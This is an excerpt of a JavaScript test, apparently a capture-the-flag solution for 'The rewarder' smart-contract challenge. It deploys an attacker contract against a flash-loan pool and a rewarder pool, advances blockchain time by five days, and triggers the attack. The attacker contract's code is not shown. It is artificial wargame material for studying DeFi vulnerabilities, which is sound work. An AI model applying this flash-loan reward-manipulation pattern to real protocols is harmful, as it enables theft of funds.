...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        this.attacker = await AttackerContractFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address, this.rewardToken.address);

        //await this.attacker.connect(attacker).executionFirstStep();

        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);

        await this.attacker.connect(attacker).execution();
    });
